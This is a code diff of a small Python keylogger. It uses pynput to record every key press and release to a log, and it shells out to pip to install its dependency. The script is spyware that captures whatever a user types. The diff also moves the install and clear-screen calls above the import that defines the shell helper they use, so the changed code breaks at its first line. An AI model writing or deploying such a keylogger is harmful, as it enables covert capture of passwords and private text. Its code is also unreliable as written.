@@ -1,3 +1,6 @@
+syst('pip install pynput')
+syst('cls')
+
 from pynput.keyboard import Key, Listener
 from os import system as syst
 import logging
@@ -11,7 +14,6 @@ def on_release(key) :
 	logging.info('\t'*4+str(key))
 	if key == Key.esc :
 		return False
-syst('pip install pynput')
-syst('cls')
+
 with Listener(on_press=on_press,on_release=on_release) as listener :
 	listener.join()
